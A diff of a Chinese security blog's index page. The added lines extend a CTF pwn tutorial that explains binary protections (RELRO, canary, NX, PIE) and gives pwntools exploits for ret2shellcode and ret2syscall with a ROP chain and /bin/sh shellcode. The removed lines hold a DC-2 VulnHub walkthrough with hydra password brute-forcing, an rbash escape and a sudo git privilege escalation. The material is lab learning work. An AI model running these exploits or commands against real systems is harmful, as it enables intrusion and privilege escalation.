+<li>确定system函数在内存中的位置：开启堆栈随机化（ASLR）之后动态链接库在内存的位置是随机的，但是一个函数在其所在的链接库内部的相对地址是不变的，如果printf函数和system函数位于同一个动态链接库，那就可以通过printf在内存中的地址+两个函数在动态链接库内的偏移得到system函数在内存中的实际位置</li>
+<li>把system函数在内存中的位置值写入printf函数在GOT表中的位置</li>
+<li>程序调用printf函数时，通过PLT表跳转到GOT表的对应条目，但是那里已经被覆写，调用的函数实际上是system而不是printf</li>
+</ul>
+</li>
+</ul>
+<p><strong>RELRO</strong></p>
+<p>让重定位表只读，避免GOT被恶意修改。RERLO有两种形式：</p>
+<ul>
+<li>部分RELRO：.init_array、.fini_array、.jcr、.dynamic这些表一次性加载，然后变成只读；.got只读；.got.plt依然可写</li>
+<li>前部RELRO：全都不准写！这样会导致所有符号在程序开始的时候导入，性能和时间开销大</li>
+</ul>
+<p><strong>Stack Canary</strong></p>
+<p>函数执行之前在栈的EBP附近插入一个值，如果被溢出攻击，那这个值就有可能被覆盖</p>
+<p><strong>NX&#x2F;DEP</strong></p>
+<p>数据段不可执行，数据段可以执行，那么就可以将自己的代码随便放在数据段的某个变量里，然后再用溢出使得函数返回到那个数据段的起始地址。开启NX之后，如果程序发现自己返回到了数据段就会终止运行。因此衍生出了ROP攻击，即利用代码段自带的片段拼凑出攻击逻辑。</p>
+<p><strong>PIE</strong></p>
+<p>地址无关的可执行文件。</p>
+<p>正常情况下，内存是这样子的：</p>
+<ul>
+<li>内核虚拟地址空间（所有进程共享，但是用户空间代码不可见）</li>
+<li>栈：函数</li>
+<li>动态映射段（动态库在这里）</li>
+<li>堆：动态申请的变量</li>
+<li>BSS段：未初始化的变量</li>
+<li>数据段：静态&#x2F;全局变量</li>
+<li>代码段：汇编代码，还有一些字面值变量</li>
+</ul>
+<p>开启PIE之后，这些段全部打散，通过GOT来登记其实际位置。</p>
 <h2 id="多种ROP利用"><a href="#多种ROP利用" class="headerlink" title="多种ROP利用"></a>多种ROP利用</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>从ctfwiki上下载ret2text二进制程序，<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text">链接</a></p>
 <p>使用<code>checksec</code>检查是否开启相关保护，可以看出，无地址随机化，无canary，仅仅开启了不可执行栈。该程序为32位程序，拖入IDA 32反汇编查看。</p>
 <p><img src="/../images/basic-pwn.assets/image-20231112154156552.png" alt="image-20231112154156552"></p>
@@ -335,7 +591,48 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc=process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#shellcode=b&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#payload=shellcode+b&quot;A&quot;*89+p32(0x0804a080)</span></span><br><span class="line">payload=shellcode+<span class="string">b&quot;A&quot;</span>*<span class="number">68</span>+p32(<span class="number">0x0804a080</span>)</span><br><span class="line">proc.recvline()</span><br><span class="line">proc.sendline(payload)</span><br><span class="line">proc.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img src="/../images/basic-pwn.assets/image-20231115031232593.png" alt="image-20231115031232593"></p>
-<p>很奇怪，EOF了，但是又好像getshell了</p>
+<p>很奇怪，EOF了.</p>
+<p>&#x3D;&#x3D;后记&#x3D;&#x3D;：后来了解到，原因是strncpy()写入的buf2在.bss段，自从Linux内核5.x之后，内存的BSS段默认没有可执行权限，该段上的权限是&#x3D;&#x3D;rw&#x3D;&#x3D;，并不是写入了stack里（stack为rwx，有执行权限），因此返回地址跳转到.bss段中的shellcode并执行，并不会真正的拿到shell。真正getshell方法较为困难，后续再探讨</p>
+<p><img src="/../images/basic-pwn.assets/image-20231116234949317.png" alt="image-20231116234949317"></p>
+<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p><img src="/../images/basic-pwn.assets/image-20231117015423484.png" alt="image-20231117015423484"></p>
+<p>直接<code>checksec</code>，开启了NX，IDA反汇编main函数</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117021653780.png" alt="image-20231117021653780"></p>
+<p>同样利用ret2shellcode的方法计算出返回地址距离v4的偏移仍为108+4</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117024843769.png" alt="image-20231117024843769"></p>
+<p>这里使用ROP技术进行攻击，ROP的全称为Return-oriented Programming（返回导向编程），这是一种高级的内存攻击技术，攻击者扫描已有的动态链接库和可执行文件，提取出可以利用的指令片段(gadget)，这些指令片段均以ret指令结尾，即用ret指令实现指令片段执行流的衔接，从而构建恶意代码。可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</p>
+<p>常见的利用方法是使用系统调用获得shell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其中，该程序是 32 位，所以我们需要使得</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb，即execve()函数的系统调用号</li>
+<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>&#x3D;&#x3D;这里待定，使用COMPILER EXPLORER编译结果使用的不是这几个寄存器&#x3D;&#x3D;<img src="/../images/basic-pwn.assets/image-20231117025655190.png" alt="image-20231117025655190"></p>
+<p>补上<code>vmmap</code>情况</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117030324644.png" alt="image-20231117030324644"></p>
+<p>首先查找汇编指令为<code>pop eax</code>，后续接<code>ret</code>的命令</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117030450390.png" alt="image-20231117030450390"></p>
+<p>使用<code>0x080bb196</code> 的地址，值得注意的是，该部分代码段有执行权限，因为我们不需要写入权限，仅仅需要ret地址为下一条目标指令即可，顺次拼接。</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117032147479.png" alt="image-20231117032147479"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>为了验证上述黄色猜想，选择这两条分别测试，其中第二条为wp选择</p>
+<p>接下来寻找字符串”&#x2F;bin&#x2F;sh”所在地址</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117031140755.png" alt="image-20231117031140755"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>最后一条是int 0x80系统调用地址</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117031300711.png" alt="image-20231117031300711"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08049421 : int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>将上述地址拼接起来，构成payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, bin_sh, int_0x80])</span><br><span class="line">sh.recvuntil(<span class="string">&quot;What do you plan to do?\n&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>最后测试结果，只有pop_edx_ecx_ebx_ret可以getshell，有点奇怪</p>
+<p><img src="/../images/basic-pwn.assets/image-20231117032438162.png" alt="image-20231117032438162"></p>
 
     
 
@@ -2226,200 +2523,6 @@ include($_GET[test]);
 
 
   
-    <article id="post-DC2靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/02/14/DC2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" target="_blank">DC2靶机渗透记录</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/02/14/DC2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="archive-article-date">
-        <time datetime="2021-02-13T18:12:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-14</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <center>DC-2渗透记录</center>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>同样，基本操作，<code>netdiscover</code>发现VMware类型的ip地址，即为目标靶机</p>
-<p><img src="/../images/image-20210213024907862.png" alt="image-20210213024907862"></p>
-<p>接下来祭出<code>nmap</code>扫描</p>
-<p><img src="/../images/image-20210213025133938.png" alt="image-20210213025133938"></p>
-<p>斯巴拉西，得到了一个重要信息<code>WordPress</code>的站，还有其对应的版本，可以有针对性的利用已知漏洞打击，先存着，先访问其http页面（80端口）得到进一步信息。</p>
-<p>就在页面很轻松能发现第一个flag。</p>
-<p><img src="/../images/image-20210213025648878.png" alt="image-20210213025648878"></p>
-<p>flag给了我们提示，需要登录，并且需要<code>cewl</code>而且提示常用wordlists可能并不起作用，所以我们需要有针对性的设计（那不就是社工字典吗QAQ）。我们先<code>dirsearch</code>一波，看能不能跑出来登录框</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://dc-2/ -e* &gt; /home/xxx/DC-2/DC2web.txt</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/../images/image-20210213030100762.png" alt="image-20210213030100762"></p>
-<p>信息还是蛮多的，登录窗口也扫出来了（wp的后台管理窗口也就那个名儿。。。），根据flag1提示，查了一下<code>Cewl</code>的使用。<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/190128.html">我是链接</a></p>
-<blockquote>
-<p>Cewl是以爬虫模式在指定URL上收集单词的工具，并将其制作成密码字典，以提高密码破解工具的成功率。</p>
-</blockquote>
-<p>针对该网站生成特定的社工字典结果如下图。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w DC2-pwd.txt http://dc-2/</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/image-20210214002259955.png" alt="image-20210214002259955"></p>
-<p>因为网站是<code>wordpress</code>，所以肯定是<code>wpscan</code>啦。先扫描可用漏洞。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 &gt; dc-2.txt</span><br></pre></td></tr></table></figure>
-
-
-
-<blockquote>
-<p>WPScan是一个扫描 WordPress 漏洞的黑盒子扫描器，可以扫描敏感文件、获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。</p>
-<p>参数：<br> –url 扫描网站<br> -e 枚举<br> u 枚举用户名，默认从1-10<br> p 枚举插件<br> t 枚举主题信息</p>
-</blockquote>
-<p>接下来枚举用户名信息</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -e u</span><br></pre></td></tr></table></figure>
-
-<p>用户信息处有惊喜，发现了<code>admin</code>，<code>jerry</code>and<code>tom</code>三个账号</p>
-<p><img src="/../images/image-20210214003751217.png" alt="image-20210214003751217"></p>
-<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>自然而然的考虑用<code>burpsuite</code>爆破账号密码。。。</p>
-<p><img src="/../images/image-20210214011240025.png" alt="image-20210214011240025"></p>
-<p>burp为防止封ip所以速度非常慢，换成hydra，，，参考burp的爆破格式构造：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -t 3 -l tom -P DC2-pwd.txt -o out.txt -f dc-2 http-form-post &#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;testcookie=1:S=location&#x27; </span><br></pre></td></tr></table></figure>
-
-<p><code>-t 3</code> 控制线程数 无此选项默认12线程，经过测试这个服务端线程开太多会无响应，所以在这里制定为1（大家应该自行尝试最佳线程数）。</p>
-<ul>
-<li><code>-l tom</code> 指定单个用户名“root”。（可替换成<code>-L 字典.txt</code>来指定一系列用户名）</li>
-<li><code>-P DC2-pwd.txt</code> 指定密码字典（可替换成<code>-p 密码</code> 指定单个密码，一般不常用</li>
-<li><code>-o out.txt</code> 将尝试过程与结果保存到out.txt</li>
-<li><code>-vV</code>显示详细过程</li>
-<li><code>-f</code> 找到一个结果后停止</li>
-<li><code>dc-2</code> 目标域名</li>
-<li><code>http-post-form</code> 使用http协议下的post方法进行破解</li>
-<li><code>/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;testcookie=1:S=location</code>登录位置在目录<code>/wp-login.php</code>处，其余参考burp。</li>
-</ul>
-<p><img src="/../images/image-20210214010701970.png" alt="image-20210214010701970"></p>
-<p>这里亲测哈，hydra牛逼！！！</p>
-<p>统计一下，只爆出来了两个</p>
-<ol>
-<li><code>jerry:adipiscing</code></li>
-<li><code>tom:parturient</code></li>
-</ol>
-<p>用我们拿到的账号密码登录上去会发现<code>flag2</code>，考虑了意思后放弃了msf搜索exp，，，因为写的很清楚，如果从版本的漏洞来打，估计需要自己构造。</p>
-<p><img src="/../images/image-20210214011455745.png" alt="image-20210214011455745"></p>
-<p>试了试传马getshell，发现有保护，也无法常规绕过。</p>
-<p><img src="/../images/image-20210214012228481.png" alt="image-20210214012228481"></p>
-<p>神奇的是，打了一个xss出来，但可惜没什么用，因为这是靶机，admin不会登陆。。。</p>
-<p><img src="/../images/image-20210214012725346.png" alt="image-20210214012725346"></p>
-<p>一时间思路断了呜呜呜，，后来检查了一遍nmap信息发现，因为使用的命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.11</span><br></pre></td></tr></table></figure>
-
-<p>这里的端口扫描似乎只会扫前1000个端口！所以万一迁移了什么端口，就会把这重要信息给漏过去！</p>
-<p>重新构造</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.11 -p 1-10000</span><br></pre></td></tr></table></figure>
-
-<p>果然，发现了7744端口的ssh登录</p>
-<p><img src="/../images/image-20210214013355889.png" alt="image-20210214013355889"></p>
-<h2 id="连入服务器"><a href="#连入服务器" class="headerlink" title="连入服务器"></a>连入服务器</h2><p>来一波ssh连接。</p>
-<p>试了几次发现，<code>jerry</code>没有这个su，有的是<code>tom</code>的，于是登录tom</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.1.11 -p 7744</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/image-20210214013704428.png" alt="image-20210214013704428"></p>
-<p>但是！很无语，受限制的shell。这里给个参考，<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/188989.html">我是链接</a></p>
-<blockquote>
-<p>rbash是Restricted Shell，即受限的shell，它与一般标准shell的区别在于会限制执行一些行为。</p>
-</blockquote>
-<p><img src="/../images/image-20210214013803467.png" alt="image-20210214013803467"></p>
-<p>可以手动添加环境来绕过shell限制</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">/bin/bash</span></span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/image-20210214014445162.png" alt="image-20210214014445162"></p>
-<p>所以我们要换用<code>su</code>来换shell。</p>
-<p><img src="/../images/image-20210214014621562.png" alt="image-20210214014621562"></p>
-<p>这时候再输入上次爆破出来的密码就能换了，但是！权限不够。。。</p>
-<p>随便试了一些命令瞎转，居然又发现了<code>flag.txt</code>XD，而且，嘴上说着没有提示，身体还是挺老实的嘛。<strong>Git</strong></p>
-<p><img src="/../images/image-20210214014905308.png" alt="image-20210214014905308"></p>
-<p><img src="/../images/image-20210214015026394.png" alt="image-20210214015026394"></p>
-<p>git命令无需root权限即可使用，那就是利用git来进行提权。sudo后，以root身份调用&#x2F;bin&#x2F;bash</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/image-20210214015519144.png" alt="image-20210214015519144"></p>
-<p><img src="/../images/image-20210214015543045.png" alt="image-20210214015543045"></p>
-<p>至此全部结束XD！！！</p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>很开心，但还是有点小瑕疵</p>
-<ol>
-<li>CMS的admin账号密码，还没有找到，不知道有什么。</li>
-<li>挺想知道如何利用wp的版本漏洞直接getshell，可惜也没找到</li>
-</ol>
-<p>以上XD</p>
-<p><img src="/../images/image-20210214020933513.png" alt="image-20210214020933513"></p>
-<p>喵的，查了一下passwd才发现，这个站似乎没有admin哇？还有那个mysql怎么回事？nonexistent?</p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/02/14/DC2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -2604,6 +2707,10 @@ include($_GET[test]);
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">pwn</a>
               </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">neural network</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
@@ -2655,21 +2762,21 @@ include($_GET[test]);
           
             <li class="search-li">
               <a href="https://Isabella2inori.github.io" target="_blank" 
-                class="search-title" title="记录工作和学习过程中的笔记：Java、前端开发、Hexo博客、聚合支付、Linux笔记、ElasticSearch、ELK日志分析">
+                class="search-title" title="老废物的牛马自我修养">
                 
                   <img src="https://gravatar.loli.net/avatar/2893555f825ca98b73daffff0afc2866?s=200&d=mp&r=g">
                 
-                技术笔记
+                Myself
               </a>
             </li>
           
             <li class="search-li">
-              <a href="https://github.com/Isabella2inori" target="_blank" 
+              <a href="https://fsjz2020.github.io" target="_blank" 
                 class="search-title" >
                 
-                  <i class="icon-link icon"></i>
+                  <img src="https://fsjz2020.github.io/images/icon.png">
                 
-                GitHub
+                FSJZ
               </a>
             </li>
           
